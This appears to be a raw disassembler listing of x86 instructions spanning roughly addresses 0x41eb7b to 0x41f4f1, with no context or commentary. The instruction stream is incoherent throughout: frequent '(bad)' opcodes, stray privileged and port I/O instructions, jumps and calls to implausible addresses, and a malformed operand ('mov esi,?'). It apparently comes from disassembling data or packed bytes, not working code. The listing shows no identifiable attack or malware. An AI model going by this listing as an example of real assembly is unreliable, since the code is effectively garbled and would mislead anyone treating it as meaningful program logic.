  41eb7b:	jno    0x41ebb0
  41eb7d:	ins    DWORD PTR es:[edi],dx
  41eb7e:	int    0x27
  41eb80:	sbb    al,BYTE PTR [eax]
	...
  41eb9a:	add    al,0x84
  41eb9c:	dec    eax
  41eb9d:	add    esi,esp
  41eb9f:	add    edi,esp
  41eba1:	clc    
  41eba2:	cmp    cl,BYTE PTR [esi+0x1523422e]
  41eba8:	add    BYTE PTR [eax+esi*8],cl
  41ebab:	(bad)  
  41ebac:	(bad)  
  41ebad:	call   0xaccab59e
  41ebb2:	jmp    0x41eb76
  41ebb4:	fdivrp st(1),st
  41ebb6:	ss out dx,eax
  41ebb8:	pop    es
  41ebb9:	loop   0x41ebe1
  41ebbb:	mov    WORD PTR [edi],es
  41ebbd:	push   cs
  41ebbe:	xchg   DWORD PTR ds:0xfffb40e7,edx
  41ebc4:	cld    
  41ebc5:	jb     0x41ec39
  41ebc7:	or     DWORD PTR [eax-0x57],ebp
  41ebca:	pusha  
  41ebcb:	sbb    al,0x0
  41ebcd:	sub    DWORD PTR [esi+0x60b5428e],0xffffffe9
  41ebd4:	sub    DWORD PTR [edi-0x11],0x9fa983ff
  41ebdb:	test   DWORD PTR [edx-0x15],ebx
  41ebde:	test   DWORD PTR [esi+eiz*2],0x7ceb5a8
  41ebe5:	inc    edi
  41ebe6:	cmp    DWORD PTR [esi-0x33],eax
  41ebe9:	loope  0x41ec40
  41ebeb:	ret    0x9842
  41ebee:	jo     0x41ec57
  41ebf0:	mov    edi,0x800d232c
  41ebf5:	sbb    al,0x1c
  41ebf7:	add    eax,0x33b07c0d
  41ebfc:	(bad)  
  41ebfd:	fiadd  DWORD PTR [eax]
	...
  41ec17:	dec    BYTE PTR [edx+eax*2-0x7b1c64b]
  41ec1e:	not    DWORD PTR [ecx-0x74]
  41ec21:	inc    edx
  41ec22:	test   DWORD PTR [ebx-0x3c],esi
  41ec25:	add    al,0x7
  41ec27:	inc    ecx
  41ec28:	dec    ecx
  41ec29:	(bad)  
  41ec2a:	fdivr  st(4),st
  41ec2c:	push   0x37
  41ec2e:	icebp  
  41ec2f:	jae    0x41ec3b
  41ec31:	inc    ebp
  41ec32:	push   0xffffffb0
  41ec34:	or     DWORD PTR [ecx],edi
  41ec36:	int3   
  41ec37:	push   DWORD PTR [esi-0x14]
  41ec3a:	add    dh,dh
  41ec3c:	mov    esi,esp
  41ec3e:	jne    0x41ec54
  41ec40:	push   cs
  41ec41:	inc    ecx
  41ec42:	clc    
  41ec43:	xchg   esi,eax
  41ec44:	mov    ebx,0x2146bf4
  41ec49:	mov    dh,BYTE PTR [ebp+0x1]
  41ec4c:	and    DWORD PTR [ebx-0x7bfb3205],esi
  41ec52:	rcl    dl,0x80
  41ec55:	inc    BYTE PTR [ecx]
  41ec57:	fld    QWORD PTR [edi+eiz*2]
  41ec5a:	inc    esp
  41ec5c:	pop    es
  41ec5d:	jns    0x41ec4b
  41ec5f:	add    DWORD PTR [bp+si+0x1145],ecx
  41ec64:	mov    ecx,0xd46e853
  41ec69:	add    BYTE PTR [eax],al
  41ec6b:	(bad)  
  41ec6c:	fdiv   st(0),st
  41ec6e:	inc    edx
  41ec70:	pushf  
  41ec71:	cmp    al,0x77
  41ec73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec74:	add    al,0x6a
  41ec76:	add    edx,eax
  41ec78:	xchg   ebp,eax
  41ec79:	add    al,0xe8
	...
  41ec93:	add    BYTE PTR [esi],bl
  41ec95:	jle    0x41ec92
  41ec97:	call   FWORD PTR [ecx]
  41ec99:	inc    esp
  41ec9a:	or     eax,DWORD PTR [ebp+ebx*2-0x29fffff7]
  41eca1:	mov    WORD PTR [eax+ebp*2],es
  41eca4:	sbb    eax,0x7001794
  41eca9:	pop    es
  41ecaa:	mov    DWORD PTR [ebp+0x69],eax
  41ecad:	mov    ah,0xe4
  41ecaf:	fidiv  DWORD PTR [eax-0x627b04f6]
  41ecb5:	sti    
  41ecb6:	xor    BYTE PTR [ebp+0xf00044c],0xfa
  41ecbd:	mov    esp,0xbcfe83e0
  41ecc2:	cld    
  41ecc3:	mov    bl,ah
  41ecc5:	in     al,0xfb
  41ecc7:	add    BYTE PTR ds:0xf4e0bd04,cl
  41eccd:	in     eax,0x43
  41eccf:	out    0xfc,eax
  41ecd1:	loop   0x41ed16
  41ecd3:	data16 jge 0x41ec81
  41ecd6:	mov    eax,0xfa2e7965
  41ecdb:	sub    DWORD PTR [edx-0x12],0x0
  41ecdf:	add    BYTE PTR [ebx],al
  41ece1:	ja     0x41ecec
  41ece3:	mov    edi,0x7177ebd3
  41ece8:	cmp    BYTE PTR [ebx+0x3a],dh
  41eceb:	call   0x430016
  41ecf0:	js     0x41ed1f
  41ecf2:	cli    
  41ecf3:	or     DWORD PTR [ebp-0x13],0x0
	...
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	dec    esp
  41ed12:	scas   al,BYTE PTR es:[edi]
  41ed13:	xchg   ecx,eax
  41ed14:	sbb    ah,dh
  41ed16:	sahf   
  41ed17:	or     DWORD PTR [esi],esi
  41ed19:	jg     0x41ed8b
  41ed1b:	stc    
  41ed1c:	out    0x72,eax
  41ed1e:	js     0x41ed27
  41ed20:	std    
  41ed21:	js     0x41ecd0
  41ed23:	test   BYTE PTR [ebx+0xed15],0x77
  41ed2a:	dec    eax
  41ed2b:	hlt    
  41ed2c:	inc    esi
  41ed2e:	lods   eax,DWORD PTR ds:[esi]
  41ed2f:	dec    ebp
  41ed30:	add    BYTE PTR [ebx-0x4099ff13],al
  41ed36:	sub    bh,BYTE PTR [eax+esi*2+0xd0262c6]
  41ed3d:	mov    ds:0x55bef438,eax
  41ed42:	jmp    0x41edbd
  41ed44:	dec    ebx
  41ed45:	dec    esp
  41ed46:	jmp    0xbf14:0x62f58938
  41ed4d:	push   edx
  41ed4e:	fnstsw WORD PTR [ebx-0x8]
  41ed51:	pop    ss
  41ed52:	test   dl,bh
  41ed54:	hlt    
  41ed55:	jmp    0x41ed96
  41ed57:	mov    DWORD PTR [eax],eax
  41ed59:	xor    eax,0x1cbefb87
  41ed5e:	add    al,0xef
  41ed60:	cld    
  41ed61:	sub    BYTE PTR [ebx],ah
  41ed63:	sub    ebp,edi
  41ed65:	or     ecx,DWORD PTR [ebp+0x48b57d17]
  41ed6b:	bound  ecx,QWORD PTR [edi-0x551395ed]
  41ed71:	retf   0xe510
  41ed74:	mov    es,WORD PTR [eax]
	...
  41ed8e:	hlt    
  41ed8f:	lea    esp,[ecx-0x28b70f49]
  41ed95:	mov    eax,ds:0xa1f7507c
  41ed9a:	sbb    al,0x4a
  41ed9c:	scas   eax,DWORD PTR es:[edi]
  41ed9d:	xchg   ebp,eax
  41ed9e:	mov    al,ds:0xf44debea
  41eda3:	std    
  41eda4:	out    0x3,al
  41eda6:	jge    0x41edea
  41eda8:	mov    bl,0x7c
  41edaa:	lods   al,BYTE PTR ds:[esi]
  41edab:	les    eax,FWORD PTR [edi]
  41edad:	hlt    
  41edae:	ins    BYTE PTR es:[edi],dx
  41edaf:	cmc    
  41edb0:	leave  
  41edb1:	adc    eax,0x1461cefd
  41edb6:	imul   ebp,edi,0xffffffee
  41edb9:	in     al,0xa5
  41edbb:	push   cs
  41edbc:	xchg   ebp,eax
  41edbd:	mov    ah,0x28
  41edbf:	(bad)  
  41edc0:	(bad)  
  41edc1:	sti    
  41edc2:	cld    
  41edc3:	into   
  41edc4:	loope  0x41ee03
  41edc6:	jae    0x41ee12
  41edc8:	pop    ss
  41edc9:	test   DWORD PTR [eax+ecx*1+0x34],edi
  41edcd:	xlat   BYTE PTR ds:[ebx]
  41edce:	je     0x41ee4a
  41edd0:	rol    DWORD PTR [ebx],cl
  41edd2:	add    DWORD PTR [eax-0x196f325],ecx
  41edd8:	push   cs
  41edd9:	add    al,bh
  41eddb:	add    al,0xe7
  41eddd:	popf   
  41edde:	repz std 
  41ede0:	fld    TBYTE PTR [ebx]
  41ede2:	sub    al,BYTE PTR [edx-0x19]
  41ede5:	or     bh,ah
  41ede7:	sub    al,bl
  41ede9:	ret    
  41edea:	inc    ebx
  41edeb:	lea    ebp,[ecx]
  41eded:	call   0xe641b368
	...
  41ee0a:	add    BYTE PTR [edx-0x3910611],dh
  41ee10:	in     eax,0xa6
  41ee12:	jmp    0xdb3ef30e
  41ee17:	adc    esp,esi
  41ee19:	adc    edx,DWORD PTR [edx-0x9]
  41ee1c:	add    al,0x81
  41ee1e:	retf   0xfe13
  41ee21:	out    0x20,eax
  41ee23:	icebp  
  41ee24:	(bad)  
  41ee25:	cld    
  41ee26:	shl    DWORD PTR [edi],1
  41ee28:	jns    0x41ee43
  41ee2a:	jmp    0xb53ef2c0
  41ee2f:	out    dx,eax
  41ee30:	in     eax,0x33
  41ee32:	je     0x41ee20
  41ee34:	inc    DWORD PTR [ebx+0x7e81dc29]
  41ee3a:	jmp    0x8ccaf336
  41ee3f:	iret   
  41ee40:	gs inc eax
  41ee42:	jle    0x41ee14
  41ee44:	std    
  41ee45:	data16 fld DWORD PTR [edx+0x42]
  41ee49:	mov    ah,0x99
  41ee4b:	jl     0x8935dcdc
  41ee51:	mov    edi,0x7b7d7e5d
  41ee56:	xchg   ebp,eax
  41ee57:	nop
  41ee58:	jno    0x41ee66
  41ee5a:	imul   edi,DWORD PTR [ebp-0x4f],0x7d8a550f
  41ee61:	jnp    0x41eee0
  41ee63:	xor    BYTE PTR [edx+0x58],0x69
  41ee67:	ins    DWORD PTR es:[edi],dx
  41ee68:	mov    eax,0x67a63cff
  41ee6d:	mov    edi,0x24
	...
  41ee86:	add    BYTE PTR [eax],al
  41ee88:	mov    eax,0x35a8660c
  41ee8d:	mov    ebx,0x41b10707
  41ee92:	mov    esp,0xb67977e1
  41ee97:	jmp    0x4efc09
  41ee9c:	mov    al,ds:0x3458848
  41eea1:	jl     0x41eee4
  41eea3:	mov    ah,0xd
  41eea5:	jl     0x41eee6
  41eea7:	xor    DWORD PTR ds:0xcb7413f,ecx
  41eead:	sbb    ecx,edx
  41eeaf:	cli    
  41eeb0:	or     eax,0x71458a01
  41eeb5:	dec    eax
  41eeb6:	call   0x3e0383be
  41eebb:	jmp    0x3cfa14
  41eec0:	mov    cs,WORD PTR [ebx-0x94efff0]
  41eec6:	sti    
  41eec7:	jne    0x41ee8a
  41eec9:	add    edx,DWORD PTR [ecx]
  41eecb:	or     dh,bl
  41eecd:	enter  0xeafc,0xd2
  41eed1:	sahf   
  41eed2:	cld    
  41eed3:	out    0x6e,eax
  41eed5:	push   cs
  41eed6:	add    BYTE PTR [eax],al
  41eed8:	push   esi
  41eed9:	sbb    al,ch
  41eedb:	pop    esi
  41eedc:	ret    0xfb03
  41eedf:	inc    DWORD PTR [eax+0x14]
  41eee2:	call   0x4a964b
  41eee7:	jmp    0x41eeaa
  41eee9:	jg     0x41eeda
  41eeeb:	call   0x41eef0
	...
  41ef04:	add    al,ch
  41ef06:	or     edi,ebx
  41ef08:	inc    esi
  41ef0a:	(bad)  
  41ef0b:	sti    
  41ef0c:	jne    0x41eec3
  41ef0e:	add    esi,DWORD PTR [ecx+0x8]
  41ef11:	mov    ch,0x97
  41ef13:	repz (bad) 
  41ef15:	mov    edx,0x445b5aa3
  41ef1a:	inc    esi
  41ef1b:	adc    BYTE PTR [eax],al
  41ef1d:	adc    eax,DWORD PTR [eax-0x735c7a10]
  41ef23:	dec    ebp
  41ef24:	mov    dl,BYTE PTR [ebx+0x7c]
  41ef27:	shl    BYTE PTR [esi+eiz*1-0x28],0xce
  41ef2c:	cmp    al,0xf4
  41ef2e:	ror    BYTE PTR [edi-0x591021fe],0xe8
  41ef35:	clc    
  41ef36:	rcr    ecx,0x72
  41ef39:	cmc    
  41ef3a:	and    edi,DWORD PTR [edx+0xe]
  41ef3d:	out    0xad,al
  41ef3f:	xor    bh,0xe4
  41ef42:	jmp    0x65b64034
  41ef47:	int3   
  41ef48:	jl     0x41ef4e
  41ef4a:	lahf   
  41ef4b:	div    ch
  41ef4d:	pop    ds
  41ef4e:	lock inc ebx
  41ef50:	sub    al,0xc4
  41ef52:	mov    ds:0x45740e76,eax
  41ef57:	sar    DWORD PTR [edx+0xf],1
  41ef5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef5b:	jl     0x41ef24
  41ef5d:	push   0xf5ca81ef
  41ef62:	fimul  DWORD PTR [edx-0x40]
  41ef65:	jmp    0x0:0x73ff2f
	...
  41ef80:	add    BYTE PTR [eax],al
  41ef82:	repnz xchg esp,eax
  41ef84:	inc    eax
  41ef85:	std    
  41ef86:	hlt    
  41ef87:	in     eax,dx
  41ef88:	add    BYTE PTR [eax+0x5e3f66f3],cl
  41ef8e:	mov    bh,0x97
  41ef90:	clc    
  41ef91:	push   edi
  41ef92:	mov    dl,0xe2
  41ef94:	add    BYTE PTR [esi-0x49],bl
  41ef97:	cwde   
  41ef98:	jns    0x41ef86
  41ef9a:	ja     0x41ef95
  41ef9c:	in     eax,dx
  41ef9d:	push   eax
  41ef9e:	dec    edx
  41ef9f:	cmp    ebx,DWORD PTR [edi+edi*8+0x68042e02]
  41efa6:	aam    0xfa
  41efa8:	sar    bh,0x93
  41efab:	fcomp  st(5)
  41efad:	inc    BYTE PTR [ebx-0x7dced38a]
  41efb3:	push   es
  41efb4:	es je  0x41efa3
  41efb7:	call   WORD PTR [ebp-0x39]
  41efbb:	stos   BYTE PTR es:[edi],al
  41efbc:	jae    0x41efba
  41efbe:	hlt    
  41efbf:	add    al,0xe7
  41efc1:	add    ebp,DWORD PTR [ebp+0x7]
  41efc4:	xor    eax,0xc69450b1
  41efc9:	add    dh,ah
  41efcb:	add    al,0x62
  41efcd:	add    esi,ecx
  41efcf:	sti    
  41efd0:	sbb    DWORD PTR ds:0x3e81c64,eax
  41efd6:	hlt    
  41efd7:	(bad)
  41efdb:	sti    
  41efdc:	push   esi
  41efdd:	hlt    
  41efde:	and    bh,bl
  41efe0:	out    0x78,al
  41efe2:	cmc    
  41efe3:	mov    DWORD PTR [ebx+0x7],ebp
	...
  41effd:	add    BYTE PTR [eax],al
  41efff:	ret    
  41f000:	ins    BYTE PTR es:[edi],dx
  41f001:	imul   esp
  41f003:	retf   
  41f004:	add    al,0xba
  41f006:	add    al,0xe4
  41f008:	and    DWORD PTR [esi],0xa389be8f
  41f00e:	pop    ss
  41f00f:	inc    esp
  41f010:	cli    
  41f011:	fcmovnb st,st(3)
  41f013:	add    al,0x45
  41f015:	out    0x99,eax
  41f017:	in     al,dx
  41f018:	pop    esp
  41f019:	lea    edi,[edx+0x37]
  41f01c:	jmp    0x3626088a
  41f021:	daa    
  41f022:	sahf   
  41f023:	jb     0x41f065
  41f025:	adc    edi,DWORD PTR [ecx+0x37]
  41f028:	stc    
  41f029:	jno    0x41f027
  41f02b:	ins    BYTE PTR es:[edi],dx
  41f02c:	stc    
  41f02d:	imul   ecx,DWORD PTR [edi+0x5f4ba09f],0x1c
  41f034:	sbb    DWORD PTR [esi-0x3d],esi
  41f037:	mov    ds:0x6b048c4a,eax
  41f03c:	inc    ebp
  41f03d:	call   0x2bcfe445
  41f042:	or     BYTE PTR [ebp+0xd],bh
  41f045:	aaa    
  41f046:	add    eax,0xa6260d33
  41f04b:	ins    BYTE PTR es:[edi],dx
  41f04c:	(bad)  
  41f04d:	and    DWORD PTR [ebx],edi
  41f04f:	xor    eax,0x3620050
  41f054:	test   bl,ch
  41f056:	shl    DWORD PTR [eax+edx*2-0x66550ab],1
  41f05d:	call   DWORD PTR [eax-0x69030678]
	...
  41f07b:	add    ah,cl
  41f07d:	fadd   QWORD PTR [edx-0x74a48c4e]
  41f083:	sub    al,0xd8
  41f085:	push   esp
  41f086:	std    
  41f087:	aam    0x37
  41f089:	adc    eax,0x28de940
  41f08e:	pop    eax
  41f08f:	outs   dx,BYTE PTR ds:[esi]
  41f090:	jb     0x41f094
  41f092:	data16 jo 0x41f0ef
  41f095:	loop   0x41f093
  41f097:	hlt    
  41f098:	push   ebx
  41f099:	adc    eax,0x458ee940
  41f09e:	lock fs mov bh,0x70
  41f0a2:	cmp    BYTE PTR [edx-0xc],dh
  41f0a5:	lea    ecx,[edx+0x41]
  41f0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0a9:	test   bl,ch
  41f0ab:	fldcw  WORD PTR [ecx+edi*8-0x76]
  41f0af:	mov    ah,0xff
  41f0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b2:	mov    ds:0xfca6a44c,al
  41f0b7:	jns    0x41f0a8
  41f0b9:	add    al,0x0
  41f0bb:	jmp    0xe2b4b60a
  41f0c0:	popa   
  41f0c1:	test   BYTE PTR [edx+0x1],bh
  41f0c4:	lock jne 0x41f0cb
  41f0c7:	daa    
  41f0c8:	jb     0x41f0c2
  41f0ca:	(bad)  
  41f0cb:	arpl   WORD PTR [edx-0x1f],bp
  41f0ce:	dec    edi
  41f0cf:	out    dx,al
  41f0d0:	xchg   ecx,eax
  41f0d1:	inc    ecx
  41f0d2:	adc    DWORD PTR [ecx],ebp
  41f0d4:	lock test BYTE PTR [edx-0x22],bh
  41f0d8:	clc    
  41f0d9:	jne    0x41f0e3
  41f0db:	(bad)  
  41f0dd:	push   ebx
  41f0de:	std    
  41f0df:	cmp    DWORD PTR [eax],eax
	...
  41f0f9:	lock xor ebx,ecx
  41f0fc:	add    dl,dl
  41f0fe:	xchg   bx,ax
  41f101:	push   ss
  41f102:	enter  0x4be,0x5d
  41f106:	pop    esp
  41f107:	xchg   esp,ebp
  41f109:	cld    
  41f10a:	mov    DWORD PTR [edx],eax
  41f10c:	lea    esp,[eax]
  41f10e:	add    eax,0x5072564d
  41f113:	push   0x47c9d85
  41f118:	cmp    eax,0x4
  41f11b:	add    BYTE PTR [ebx+0x50fb5b4b],cl
  41f121:	and    eax,0x54fc418a
  41f126:	shl    DWORD PTR [esi+0x28],0xf5
  41f12a:	shl    BYTE PTR [ecx+0x43],1
  41f12d:	or     eax,0x1cec16ed
  41f132:	add    eax,0x32157587
  41f137:	xlat   BYTE PTR ds:[ebx]
  41f138:	cmp    BYTE PTR [eax],dl
  41f13a:	(bad)
  41f13d:	or     eax,0xe5bf2d7c
  41f142:	out    0x3f,al
  41f144:	add    BYTE PTR [edx-0x40e7eefd],cl
  41f14a:	inc    esp
  41f14b:	add    BYTE PTR [eax],bh
  41f14d:	lock rcr cl,0x43
  41f151:	fnstsw WORD PTR [ebp+0x16]
  41f154:	call   0x421550
  41f159:	pop    ecx
  41f15a:	shl    DWORD PTR [eax+0xd],0x0
	...
  41f176:	inc    esp
  41f177:	es (bad) 
  41f179:	fstp   QWORD PTR [esi+0x4]
  41f17c:	mov    BYTE PTR ds:0x3fe5dd,0x8c
  41f183:	pop    ebx
  41f184:	sti    
  41f185:	adc    eax,0x400ef1
  41f18a:	add    al,0x65
  41f18c:	cld    
  41f18d:	(bad)  
  41f18e:	hlt    
  41f18f:	sub    ah,cl
  41f191:	dec    edi
  41f192:	mov    esi,?
  41f194:	xchg   ebx,eax
  41f195:	(bad)  
  41f196:	jnp    0x41f209
  41f198:	dec    eax
  41f199:	enter  0xb6c4,0x77
  41f19d:	or     al,0x5c
  41f19f:	ror    BYTE PTR [ebp+0x76563fe],cl
  41f1a5:	jmp    0x4002cc94
  41f1aa:	aaa    
  41f1ab:	jae    0x41f215
  41f1ad:	call   0x72cfa4b9
  41f1b2:	in     al,dx
  41f1b3:	fs pop ds
  41f1b5:	sub    DWORD PTR [ecx+0x34310181],0x810d1ec5
  41f1bf:	scas   al,BYTE PTR es:[edi]
  41f1c0:	call   0x12f019f
  41f1c5:	ret    0xedec
  41f1c8:	push   0x8
  41f1ca:	pushf  
  41f1cb:	int    0x77
  41f1cd:	inc    ecx
  41f1ce:	hlt    
  41f1cf:	inc    ebp
  41f1d0:	xchg   esi,eax
  41f1d1:	call   0x62c7dfcb
  41f1d6:	clc    
  41f1d7:	in     eax,dx
  41f1d8:	lea    eax,[edx+0x0]
	...
  41f1f3:	cld    
  41f1f4:	ss xor eax,ebp
  41f1f7:	sub    DWORD PTR [ebx+0x4],esp
  41f1fa:	add    bh,cl
  41f1fc:	fidiv  WORD PTR ds:0x8e2b34c0
  41f202:	(bad)  
  41f203:	fsubr  QWORD PTR [edx+0x50]
  41f206:	cld    
  41f207:	retf   
  41f208:	bound  ecx,QWORD PTR [eax+0x8]
  41f20b:	ja     0x41f1da
  41f20d:	add    al,ch
  41f20f:	mov    WORD PTR [edx],ss
  41f211:	add    al,0x0
  41f213:	mov    dh,0xe1
  41f215:	add    BYTE PTR [edx-0x8],ch
  41f218:	test   DWORD PTR [eax+0x73],edx
  41f21b:	aaa    
  41f21c:	out    dx,al
  41f21d:	call   0xe846817f
  41f222:	add    esi,DWORD PTR [ebp+0x61]
  41f225:	fild   DWORD PTR [edi*2-0x3bff20bf]
  41f22c:	in     al,dx
  41f22d:	sahf   
  41f22e:	cmp    DWORD PTR [ebx-0x9],0xeb58476f
  41f235:	in     al,dx
  41f236:	xor    al,0x34
  41f238:	inc    esp
  41f239:	stos   BYTE PTR es:[edi],al
  41f23a:	(bad)  
  41f23b:	(bad)  
  41f23c:	in     al,dx
  41f23d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f23e:	inc    edi
  41f23f:	push   eax
  41f240:	pushf  
  41f241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f242:	add    DWORD PTR [ecx-0x7d],edx
  41f245:	sub    eax,DWORD PTR [eax]
  41f247:	dec    ecx
  41f248:	mov    ebp,DWORD PTR [ebx]
  41f24a:	call   0x3c45aaa
  41f24f:	hlt    
  41f250:	ret    0x3ea
  41f253:	sahf   
  41f254:	or     BYTE PTR [edi],cl
  41f256:	inc    esp
	...
  41f26f:	add    BYTE PTR [edi-0x2a1418bd],ah
  41f275:	jmp    0x41f25e
  41f277:	add    esi,DWORD PTR [ebp+0x61]
  41f27a:	arpl   WORD PTR [edi*2-0x3bff10bf],ax
  41f281:	in     al,dx
  41f282:	push   edx
  41f283:	add    DWORD PTR [ebx],0x10475ff7
  41f289:	jmp    0x41f27f
  41f28b:	xor    al,0xb4
  41f28d:	inc    ebp
  41f28e:	sub    cl,BYTE PTR [ebp+0x472ded56]
  41f294:	fcomp  DWORD PTR [ebp-0x7d26fed3]
  41f29a:	mov    bl,0xff
  41f29c:	ror    BYTE PTR [edx+0x35d3e7a3],1
  41f2a2:	add    al,BYTE PTR [ebx]
  41f2a4:	hlt    
  41f2a5:	ret    0x3e2
  41f2a8:	dec    esi
  41f2a9:	ins    DWORD PTR es:[edi],dx
  41f2aa:	(bad)  
  41f2ab:	xor    esp,DWORD PTR [edi]
  41f2ad:	inc    edx
  41f2ae:	out    0xeb,eax
  41f2b0:	xchg   ecx,eax
  41f2b1:	jmp    0x41f2b2
  41f2b3:	out    0xf7,eax
  41f2b5:	mov    esi,DWORD PTR [edx-0x23]
  41f2b8:	loopne 0x41f2b1
  41f2ba:	xchg   BYTE PTR [esp+esi*8+0x4f],ah
  41f2be:	push   ebp
  41f2bf:	ss sub eax,0x3a645550
  41f2c5:	lea    ecx,[edi+0x62]
  41f2c8:	xor    cl,BYTE PTR ds:0x145ff9fd
  41f2ce:	jge    0x41f2b8
  41f2d0:	idiv   DWORD PTR [ebp+0x42]
  41f2d3:	int    0x0
	...
  41f2ed:	js     0x41f33a
  41f2ef:	cld    
  41f2f0:	scas   al,BYTE PTR es:[edi]
  41f2f1:	dec    eax
  41f2f2:	adc    BYTE PTR [ecx],dh
  41f2f4:	test   eax,0x488c3b7
  41f2f9:	pop    eax
  41f2fa:	ins    BYTE PTR es:[edi],dx
  41f2fb:	cwde   
  41f2fc:	xor    DWORD PTR [edi+0x43],ebp
  41f2ff:	in     al,0x6a
  41f301:	stos   BYTE PTR es:[edi],al
  41f302:	clc    
  41f303:	cld    
  41f304:	mov    edx,0xed728bf4
  41f309:	call   0x7fadffcd
  41f30e:	idiv   ah
  41f310:	jmp    0x6d4ee2ed
  41f315:	gs idiv ah
  41f318:	jmp    0xbf972fb6
  41f31d:	hlt    
  41f31e:	adc    DWORD PTR [eax-0x9],edx
  41f321:	mov    bh,0x4
  41f323:	sub    DWORD PTR ds:0xa4895f03,0xef875f7f
  41f32d:	dec    ebp
  41f32e:	mov    WORD PTR [edx+0x5d],es
  41f331:	dec    ebp
  41f332:	jle    0x41f379
  41f334:	jmp    0x41f393
  41f336:	mov    WORD PTR [edx+0x79],es
  41f339:	pop    ebp
  41f33a:	jle    0x41f381
  41f33c:	in     eax,dx
  41f33d:	dec    ebp
  41f33e:	mov    WORD PTR [edx+0x75],es
  41f341:	dec    ebp
  41f342:	jle    0x41f389
  41f344:	add    BYTE PTR [ebx+0x249c4188],ah
  41f34a:	dec    esp
  41f34b:	or     BYTE PTR [ebx+0x4685a150],cl
	...
  41f369:	add    BYTE PTR [ebp+0x4a44188],bh
  41f36f:	aas    
  41f370:	adc    al,0x8b
  41f372:	shr    BYTE PTR [eax-0x757ab97b],1
  41f378:	inc    ecx
  41f379:	lods   al,BYTE PTR ds:[esi]
  41f37a:	adc    al,0x3f
  41f37c:	sbb    al,0x66
  41f37e:	out    0x4b,al
  41f380:	mov    al,0x66
  41f382:	in     al,0x3e
  41f384:	and    BYTE PTR [esi-0x2a],ah
  41f387:	dec    ebx
  41f388:	mov    ah,0x66
  41f38a:	aam    0x3e
  41f38c:	and    ah,BYTE PTR [esi-0x3a]
  41f38f:	dec    ebx
  41f390:	mov    eax,0x243ec466
  41f395:	data16 (bad) 
  41f397:	dec    ebx
  41f398:	mov    esp,0x263ed466
  41f39d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f39f:	dec    ebx
  41f3a0:	shl    BYTE PTR [esi-0x5c],0x3e
  41f3a4:	sub    BYTE PTR [ebx+0x4685ccd0],cl
  41f3aa:	pop    ecx
  41f3ab:	mov    al,BYTE PTR [ecx-0x68]
  41f3ae:	(bad)  
  41f3af:	mov    ebp,0xbe9e0f70
  41f3b4:	sub    al,0x56
  41f3b6:	cmp    eax,0x3d10e4c0
  41f3bb:	not    BYTE PTR [ecx]
  41f3bd:	add    al,0xcc
  41f3bf:	dec    eax
  41f3c0:	add    BYTE PTR [ebx],dh
  41f3c2:	sbb    eax,0xccea3de1
  41f3c7:	or     dl,al
  41f3c9:	or     ch,cl
  41f3cb:	pop    esi
  41f3cc:	or     al,0x68
	...
  41f3e6:	add    BYTE PTR [ebp-0x1affc093],bh
  41f3ec:	sti    
  41f3ed:	in     eax,0x1
  41f3ef:	hlt    
  41f3f0:	fld    QWORD PTR [ecx+0x66deb862]
  41f3f6:	add    BYTE PTR [edi-0x5f],bh
  41f3f9:	or     ch,bh
  41f3fb:	in     al,0x15
  41f3fd:	cmp    eax,0x8bddf58c
  41f402:	inc    edx
  41f403:	nop
  41f404:	pop    es
  41f405:	push   cs
  41f406:	xor    DWORD PTR [esi+ebx*1-0x29ee773f],esi
  41f40d:	lds    eax,FWORD PTR [edx-0x68]
  41f410:	jbe    0x41f410
  41f412:	cld    
  41f413:	jnp    0x41f474
  41f415:	push   eax
  41f416:	cld    
  41f417:	jae    0x41f490
  41f419:	dec    eax
  41f41a:	in     al,0x5c
  41f41c:	(bad)  
  41f41e:	(bad)  
  41f41f:	arpl   WORD PTR [eax-0x2e31fffc],sp
  41f425:	push   0x41ec910
  41f42a:	call   0x4589bc
  41f42f:	ja     0x41f432
  41f431:	add    BYTE PTR [eax],al
  41f433:	outs   dx,DWORD PTR ds:[esi]
  41f434:	sub    DWORD PTR [edi*8-0x7bee6a1c],ecx
  41f43b:	cmc    
  41f43c:	fisttp QWORD PTR [ebx+0xa871842]
  41f442:	xor    DWORD PTR [esi+ebx*1],esi
  41f445:	ror    DWORD PTR [eax+0x42c65599],0x0
	...
  41f464:	adc    BYTE PTR [esi+0x5f03fcfd],al
  41f46a:	push   eax
  41f46b:	cld    
  41f46c:	sti    
  41f46d:	dec    ax
  41f46f:	in     al,0xdc
  41f471:	and    ch,ah
  41f473:	(bad)  
  41f474:	jmp    0x41f495
  41f476:	add    eax,0x68ea4e00
  41f47b:	add    BYTE PTR [ecx-0x61],ah
  41f47e:	add    al,ch
  41f480:	push   ecx
  41f481:	add    eax,0x87f40410
  41f486:	cmp    edi,0xffffffc3
  41f489:	repnz fwait
  41f48b:	adc    edi,DWORD PTR [ecx+0x368adb79]
  41f491:	std    
  41f492:	add    eax,0x68459c33
  41f497:	add    al,0xf4
  41f499:	mov    DWORD PTR [esi],esp
  41f49b:	jnp    0x41f48a
  41f49d:	jg     0x41f43a
  41f49f:	pop    ss
  41f4a0:	jnp    0x41f4a7
  41f4a2:	push   0x67
  41f4a4:	nop
  41f4a5:	add    al,0xd2
  41f4a7:	adc    DWORD PTR [ebx+0x49],edi
  41f4aa:	retf   
  41f4ab:	jmp    0x44e92c99
  41f4b0:	xor    eax,0x30ec4b7f
  41f4b5:	dec    ecx
  41f4b6:	ret    
  41f4b7:	pushf  
  41f4b8:	pusha  
  41f4b9:	repz mov ch,0x81
  41f4bc:	scas   al,BYTE PTR es:[edi]
  41f4bd:	lock lods eax,DWORD PTR ds:[esi]
  41f4bf:	mov    DWORD PTR [esi+0x53768ee8],esi
  41f4c5:	add    eax,0xc1e7
	...
  41f4de:	add    BYTE PTR [eax],al
  41f4e0:	add    bl,dh
  41f4e2:	add    al,0x3c
  41f4e4:	mov    DWORD PTR [edi-0x79],ecx
  41f4e7:	jp     0x41f51d
  41f4e9:	jle    0x41f4e7
  41f4eb:	retw   
  41f4ed:	fstp   TBYTE PTR [ebx+ebp*1-0xc]
  41f4f1:	ins    DWORD PTR es:[edi],dx
